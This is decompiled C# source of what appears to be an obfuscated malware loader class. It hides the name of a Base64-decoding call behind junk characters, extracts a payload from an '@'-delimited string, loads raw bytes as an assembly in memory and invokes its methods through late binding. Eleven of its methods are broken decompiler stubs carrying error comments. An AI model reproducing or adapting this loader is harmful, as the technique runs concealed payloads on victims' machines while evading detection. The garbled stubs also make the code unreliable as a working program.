using System;
using System.Collections;
using System.Deployment.Internal.Isolation;
using System.Diagnostics;
using System.Reflection;
using System.Reflection.Cache;
using System.Runtime.CompilerServices;
using System.Runtime.Remoting.Contexts;
using System.Runtime.Remoting.Messaging;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class GClass3
{
	public delegate object GDelegate9();

	public delegate object GDelegate10(string o);

	public delegate void GDelegate11(object[] obj);

	private static _003F Item => Assembly.Load(data);

	public static object Dwje(object o)
	{
		return RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(o, (Type)null, "GetMethod", new object[1] { "adkwjkajdlajwdk#FromBase64String".Remove(0, 16) }, (string[])null, (Type[])null, (bool[])null));
	}

	public static object SqXB84jckOpaquwoO()
	{
		object objectValue = RuntimeHelpers.GetObjectValue(GClass2.Penny9());
		object obj = GClass6.crYe120MpRCSWYQpSwh(Conversions.ToString(objectValue), "@", -1, (CompareMethod)0)[3];
		return Strings.Replace(Conversions.ToString(obj), GClass2.OkUf55uDsYTUSXIBI, "@", 1, -1, (CompareMethod)0);
	}

	public static object SdX89sCaUxzgmGO(byte[] B, object[] Params)
	{
		object objectValue = RuntimeHelpers.GetObjectValue(dreams0(B));
		object objectValue2 = RuntimeHelpers.GetObjectValue(GClass4.mActv((Type)objectValue));
		return GClass4.InvkM(RuntimeHelpers.GetObjectValue(objectValue2), Params, RuntimeHelpers.GetObjectValue(objectValue));
	}

	private static object dreams0(object b)
	{
		checked
		{
			int num = GClass3.get_Item((byte[])b).GetTypes().Length - 1;
			int num2 = 0;
			object result = default(object);
			while (true)
			{
				if (num2 <= num)
				{
					if (GClass4.GFCNTN(GClass3.get_Item((byte[])b).GetTypes()[num2]) != null)
					{
						break;
					}
					num2++;
					continue;
				}
				return result;
			}
			return GClass3.get_Item((byte[])b).GetTypes()[num2];
		}
	}

	private static MethodInfo[] _m(Type t)
	{
		return t.GetMethods();
	}

	public static object Rnanw9()
	{
		return Delegate.CreateDelegate(typeof(GForm0.GDelegate1), (MethodInfo)GClass0.aw98());
	}

	static EventWaitHandle WBONdgjbzPIracw()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static DebuggerVisualizerAttribute PThdMazzajvYrXu()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static CreateActContextParametersSource DdDPJbKgQbhdoGV()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static Stack.StackDebugView STcBuYaHNgoeKFG()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static MidpointRounding tykqxPpoFuxpOrW()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static MRMWrapperDictionary JrfzqhvGonbbDLX()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static ClearCacheHandler DXCarEspjCyVFQW()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static ISTORE_ENUM_ASSEMBLIES_FLAGS xJabwyIfMpGmsMU()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static MessageEnd zfaaZePIPtUGWZc()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static IContextPropertyActivator XwZEojYsjanyhgU()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static AppDomainInitializer iKgsHoGrvWKICUR()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}
}
